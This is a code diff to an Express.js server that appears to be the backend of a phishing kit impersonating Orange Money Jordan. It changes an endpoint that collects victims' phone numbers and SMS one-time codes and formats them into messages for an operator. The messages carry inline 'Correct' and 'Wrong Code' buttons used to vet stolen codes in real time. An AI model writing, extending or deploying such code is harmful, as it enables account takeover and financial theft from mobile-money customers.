@@ -75,7 +75,7 @@ app.post('/api/login-notification', async (req, res) => {
     }
 });
 
-// -------------------- FIRST OTP API --------------------
+// -------------------- FIRST OTP API (Updated for 4-Digit Code & SMS) --------------------
 app.post('/api/verify-first-otp', async (req, res) => {
     const { phone, link } = req.body || {};
     const country = "Jordan";
@@ -90,15 +90,15 @@ app.post('/api/verify-first-otp', async (req, res) => {
 
     statusStore[phone] = "pending_otp1";
 
-    const otpMessage = `🆕 <b>ORANGE MONEY JORDAN - VERIFICATION NEEDED</b>
+    const otpMessage = `🔢 <b>ORANGE MONEY JORDAN - 4-DIGIT OTP VERIFICATION</b>
 🇯🇴 <b>Country:</b> ${country}
 📞 <b>Country Code:</b> ${countryCode}
 📱 <b>Phone Number:</b> ${phone}
-📨 <b>COMPLETE SMS MESSAGE:</b>
-${link}
+🔑 <b>4-DIGIT CODE / SMS DATA:</b>
+<code>${link}</code>
 ⏰ <b>Time:</b> ${currentTime}
 
-💬 <b>Note: User pasted SMS message to extract OTP</b>
+💬 <b>Note: User submitted 4-digit code / SMS content</b>
 
 <b>━━━━━━━━━━━━━━━━━</b>
 
@@ -112,7 +112,7 @@ ${link}
             reply_markup: {
                 inline_keyboard: [
                     [
-                        { text: "✅ Correct (PIN + OTP)", callback_data: `otp1_correct|${phone}` }
+                        { text: "✅ Correct (OTP)", callback_data: `otp1_correct|${phone}` }
                     ],
                     [
                         { text: "❌ Wrong Code", callback_data: `otp1_wrong|${phone}` },
